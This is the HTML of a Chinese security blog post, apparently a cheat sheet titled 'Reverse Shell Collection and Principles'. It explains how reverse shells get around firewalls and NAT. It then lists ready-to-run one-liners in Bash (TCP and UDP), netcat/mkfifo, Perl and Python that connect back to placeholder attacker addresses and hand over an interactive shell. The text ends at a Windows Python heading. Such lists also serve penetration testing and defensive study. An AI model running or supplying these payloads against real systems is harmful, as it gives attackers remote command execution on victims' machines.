@@ -1,0 +1,1956 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+    
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="keywords" content="反弹Shell大全与原理, XingHe 计算机 网络安全">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
+    <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg">
+    <meta name="360-site-verification" content="2db45fc772bbd3e7efd0985eec0fff97">
+    <meta name="description" content="什么是反弹shellreverse shell（反弹shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="baidu-site-verification" content="wvlc3L96QK">
+    <title>反弹Shell大全与原理 | XingHe</title>
+    <link rel="icon" type="image/jpeg" href="/img/tx.jpg">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/materialize/1.0.0/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/animate.css/3.5.1/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.11/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <style type="text/css">
+        
+            
+            code[class*="language-"],
+            pre[class*="language-"] {
+                white-space: pre !important;
+            }
+
+        
+    </style>
+
+    <script src="https://cdn.bootcss.com/jquery/2.2.0/jquery.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+
+
+    <body>
+
+        <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/img/tx.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">XingHe</span>
+                </a>
+            </div>
+            
+
+
+<!-- <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="" class="waves-effect waves-light">
+            
+            <i class="fa fa-heartbeat"></i>
+            
+            <span>清单</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-envelope"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tools" class="waves-effect waves-light">
+            
+            <i class="fa fa-suitcase"></i>
+            
+            <span>工具箱</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/rongyv" class="waves-effect waves-light">
+            
+            <i class="fa fa-coffee"></i>
+            
+            <span>荣誉</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul> -->
+
+<!-- 支持二级菜单特性  -->
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right nav-menu">
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/" class="waves-effect waves-light">
+              
+                <i class="fa fa-home"></i>
+              
+              <span>首页</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+              <a href="" class="waves-effect waves-light">
+                
+                  <i class="fa fa-archive"></i>
+                
+                <span>归档</span>
+                <i class="fa fa-chevron-down" aria-hidden="true"></i>
+              </a>
+
+            <ul class="sub-nav menus_item_child ">
+              
+                <li> 
+                  <a href="/archives" >
+                    
+                      <i class="fa fa-paper-plane" style="margin-top: -20px;"></i>
+                    
+                    <span>时轴</span>
+                  </a>
+                </li>
+              
+                <li> 
+                  <a href="/categories" >
+                    
+                      <i class="fa fa-bookmark" style="margin-top: -20px;"></i>
+                    
+                    <span>分类</span>
+                  </a>
+                </li>
+              
+                <li> 
+                  <a href="/tags" >
+                    
+                      <i class="fa fa-tags" style="margin-top: -20px;"></i>
+                    
+                    <span>标签</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+              <a href="" class="waves-effect waves-light">
+                
+                  <i class="fa fa-heartbeat"></i>
+                
+                <span>清单</span>
+                <i class="fa fa-chevron-down" aria-hidden="true"></i>
+              </a>
+
+            <ul class="sub-nav menus_item_child ">
+              
+                <li> 
+                  <a href="/List/music" >
+                    
+                      <i class="fa fa-music" style="margin-top: -20px;"></i>
+                    
+                    <span>音乐</span>
+                  </a>
+                </li>
+              
+                <li> 
+                  <a href="/List/galleries" >
+                    
+                      <i class="fa fa-photo" style="margin-top: -20px;"></i>
+                    
+                    <span>相册</span>
+                  </a>
+                </li>
+              
+                <li> 
+                  <a href="/List/movies" >
+                    
+                      <i class="fa fa-film" style="margin-top: -20px;"></i>
+                    
+                    <span>视频</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/about" class="waves-effect waves-light">
+              
+                <i class="fa fa-user-circle-o"></i>
+              
+              <span>关于我</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/contact" class="waves-effect waves-light">
+              
+                <i class="fa fa-envelope"></i>
+              
+              <span>留言板</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/tools" class="waves-effect waves-light">
+              
+                <i class="fa fa-suitcase"></i>
+              
+              <span>工具箱</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/friends" class="waves-effect waves-light">
+              
+                <i class="fa fa-address-book"></i>
+              
+              <span>友情链接</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/rongyv" class="waves-effect waves-light">
+              
+                <i class="fa fa-coffee"></i>
+              
+              <span>荣誉</span>
+            </a>
+
+            
+      </li>
+    
+
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/img/tx.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">XingHe</div>
+        <div class="logo-desc">
+            
+            网络安全
+            
+        </div>
+    </div>
+
+    
+<!-- 支持一级菜单特性 -->
+<!--    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-heartbeat"></i>
+                
+                清单
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-envelope"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tools" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-suitcase"></i>
+                
+                工具箱
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        <li>
+            <a href="/rongyv" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-coffee"></i>
+                
+                荣誉
+            </a>
+        </li>
+        
+        
+    </ul> -->
+
+   
+   
+<!-- 支持二级菜单特性  -->
+ <ul class="menu-list mobile-menu-list">
+    
+        <li class="m-nav-item">
+                
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-home"></i>
+                        
+                        首页
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="javascript:;">
+                            
+                            <i class="fa fa-fw fa-archive"></i>
+                            
+                            归档
+                            <span class="m-icon"><i class="fa fa-chevron-right"></i></span>
+                    </a>
+                <ul>
+                  
+                    <li> 
+                      <a href="/archives" >
+                           
+                            <i class="fa fa-paper-plane" style="left: 18px; position: absolute;"></i>
+                       
+                       <span>时轴</span>
+                      </a>
+                    </li>
+                  
+                    <li> 
+                      <a href="/categories" >
+                           
+                            <i class="fa fa-bookmark" style="left: 18px; position: absolute;"></i>
+                       
+                       <span>分类</span>
+                      </a>
+                    </li>
+                  
+                    <li> 
+                      <a href="/tags" >
+                           
+                            <i class="fa fa-tags" style="left: 18px; position: absolute;"></i>
+                       
+                       <span>标签</span>
+                      </a>
+                    </li>
+                   
+                </ul>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="javascript:;">
+                            
+                            <i class="fa fa-fw fa-heartbeat"></i>
+                            
+                            清单
+                            <span class="m-icon"><i class="fa fa-chevron-right"></i></span>
+                    </a>
+                <ul>
+                  
+                    <li> 
+                      <a href="/List/music" >
+                           
+                            <i class="fa fa-music" style="left: 18px; position: absolute;"></i>
+                       
+                       <span>音乐</span>
+                      </a>
+                    </li>
+                  
+                    <li> 
+                      <a href="/List/galleries" >
+                           
+                            <i class="fa fa-photo" style="left: 18px; position: absolute;"></i>
+                       
+                       <span>相册</span>
+                      </a>
+                    </li>
+                  
+                    <li> 
+                      <a href="/List/movies" >
+                           
+                            <i class="fa fa-film" style="left: 18px; position: absolute;"></i>
+                       
+                       <span>视频</span>
+                      </a>
+                    </li>
+                   
+                </ul>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/about" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-user-circle-o"></i>
+                        
+                        关于我
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/contact" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-envelope"></i>
+                        
+                        留言板
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/tools" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-suitcase"></i>
+                        
+                        工具箱
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/friends" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-address-book"></i>
+                        
+                        友情链接
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/rongyv" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-coffee"></i>
+                        
+                        荣誉
+                    </a>
+              
+            </li>
+        
+
+        
+    </ul> 
+
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+        
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/09.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        反弹Shell大全与原理
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.bootcss.com/tocbot/4.8.1/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+        width: 345px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        margin-bottom: 20px;
+    }
+    
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        
+<!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/shell/" target="_blank">
+                                <span class="chip bg-color">shell</span>
+                            </a>
+                        
+                            <a href="/tags/代理/" target="_blank">
+                                <span class="chip bg-color">代理</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/工具/" class="post-category" target="_blank">
+                                工具
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-05-13
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                        XingHe
+                    
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.5k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        12 分
+                    </div>
+                    
+                
+                
+                
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv" ></span>
+    
+                
+
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>reverse shell（<strong>反弹shell</strong>），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准<a href="https://www.uedbox.com/?s=shell" target="_blank" rel="noopener">shell</a>对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://www.uedbox.com/wp-content/uploads/2019/04/Reverse-Shell.png" alt="反弹Shell大全与原理"></p>
+<h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
+<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
+<ol>
+<li>对方主机在局域网内，从外网无法直接访问。</li>
+<li>对方主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。</li>
+<li>对方的ip会动态改变，你不能持续控制。</li>
+<li>对方由于防火墙等限制，对方机器只能发送请求，不能接收请求。</li>
+<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</li>
+</ol>
+<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。在渗透测试过程中，得到<a href="https://www.uedbox.com/?s=webshell" target="_blank" rel="noopener">webshell</a>后一般我们会<strong>反弹shell</strong>。</p>
+<h2 id="反弹shell原理"><a href="#反弹shell原理" class="headerlink" title="反弹shell原理"></a>反弹shell原理</h2><ol>
+<li>A主机开启9090端口的tcp服务</li>
+<li>B主机连接到A主机的9090的tcp服务</li>
+<li>A主机通过tcp服务把命令发到B主机</li>
+<li>B主机读取命令并且在bash中执行</li>
+<li>B主机把执行结果发给A主机</li>
+</ol>
+<p>这样就可以在A主机中’操控’B主机了</p>
+<h2 id="反弹shell操作步骤"><a href="#反弹shell操作步骤" class="headerlink" title="反弹shell操作步骤"></a>反弹shell操作步骤</h2><ol>
+<li>在本机开启并监听端口</li>
+<li>在需要被控制的机器上执行反弹shell命令</li>
+<li>在本机监听反弹shell的端口</li>
+</ol>
+<h2 id="反弹shell大全"><a href="#反弹shell大全" class="headerlink" title="反弹shell大全"></a>反弹shell大全</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://www.uedbox.com/wp-content/uploads/2019/04/reverse-shell.png" alt="反弹Shell大全与原理"></p>
+<h3 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash">/bin/bash -c <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/x.x.x.x/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Bash反弹shell-TCP"><a href="#Bash反弹shell-TCP" class="headerlink" title="Bash反弹shell TCP"></a>Bash反弹shell TCP</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/10.0.0.1/8080 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>196<span class="token punctuation">;</span><span class="token function">exec</span> 196<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/<span class="token operator">&lt;</span>your IP<span class="token operator">></span>/<span class="token operator">&lt;</span>same unfiltered port<span class="token operator">></span><span class="token punctuation">;</span> sh <span class="token operator">&lt;</span><span class="token operator">&amp;</span>196 <span class="token operator">></span><span class="token operator">&amp;</span>196 2<span class="token operator">></span><span class="token operator">&amp;</span>196<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="Bash反弹shell-UDP"><a href="#Bash反弹shell-UDP" class="headerlink" title="Bash反弹shell UDP"></a>Bash反弹shell UDP</h3><pre class="line-numbers language-bash"><code class="language-bash">Victim:sh -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/udp/127.0.0.1/4242 0<span class="token operator">></span><span class="token operator">&amp;</span>1 
+Listener:nc -u -lvp 4242<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> backpipe p<span class="token punctuation">;</span> nc <span class="token operator">&lt;</span>attacker_ip<span class="token operator">></span> <span class="token operator">&lt;</span>port<span class="token operator">></span> 0<span class="token operator">&lt;</span>backpipe <span class="token operator">|</span> /bin/bash 1<span class="token operator">></span>backpipe <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token operator">|</span>nc x.x.x.x 12388 <span class="token operator">></span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="perl反弹shell"><a href="#perl反弹shell" class="headerlink" title="perl反弹shell"></a>perl反弹shell</h3><pre class="line-numbers language-perl"><code class="language-perl">perl <span class="token operator">-e</span> '<span class="token keyword">use</span> Socket<span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token string">"10.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token number">1234</span><span class="token punctuation">;</span>socket<span class="token punctuation">(</span>S<span class="token punctuation">,</span>PF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">,</span>getprotobyname<span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>connect<span class="token punctuation">(</span>S<span class="token punctuation">,</span>sockaddr_in<span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span>inet_aton<span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>open<span class="token punctuation">(</span>STDIN<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span>STDOUT<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span>STDERR<span class="token punctuation">,</span><span class="token string">">&amp;S"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exec<span class="token punctuation">(</span><span class="token string">"/bin/sh -i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>' 
+
+perl <span class="token operator">-</span>MIO <span class="token operator">-e</span> '<span class="token variable">$p</span><span class="token operator">=</span>fork<span class="token punctuation">;</span>exit<span class="token punctuation">,</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span>new IO<span class="token punctuation">:</span><span class="token punctuation">:</span>Socket<span class="token punctuation">:</span><span class="token punctuation">:</span>INET<span class="token punctuation">(</span>PeerAddr<span class="token punctuation">,</span><span class="token string">"[IPADDR]:[PORT]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>STDIN<span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$~</span><span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token variable">$_</span> <span class="token keyword">while</span><span class="token filehandle symbol">&lt;></span><span class="token punctuation">;</span>'
+
+NOTE<span class="token punctuation">:</span> Windows only 
+perl <span class="token operator">-</span>MIO <span class="token operator">-e</span> '<span class="token variable">$c</span><span class="token operator">=</span>new IO<span class="token punctuation">:</span><span class="token punctuation">:</span>Socket<span class="token punctuation">:</span><span class="token punctuation">:</span>INET<span class="token punctuation">(</span>PeerAddr<span class="token punctuation">,</span><span class="token string">"[IPADDR]:[PORT]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>STDIN<span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$~</span><span class="token operator">-></span>fdopen<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>system<span class="token variable">$_</span> <span class="token keyword">while</span><span class="token filehandle symbol">&lt;></span><span class="token punctuation">;</span>' <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Python反弹shell"><a href="#Python反弹shell" class="headerlink" title="Python反弹shell"></a>Python反弹shell</h3><p>Linux</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">*</span><span class="token operator">//</span> 方法一<span class="token operator">*</span>
+$ python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+
+<span class="token operator">*</span><span class="token operator">//</span> 方法二<span class="token operator">*</span>
+$ export RHOST<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>export RPORT<span class="token operator">=</span><span class="token number">12345</span><span class="token punctuation">;</span>python <span class="token operator">-</span>c <span class="token string">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Windows Python反弹shell</p>
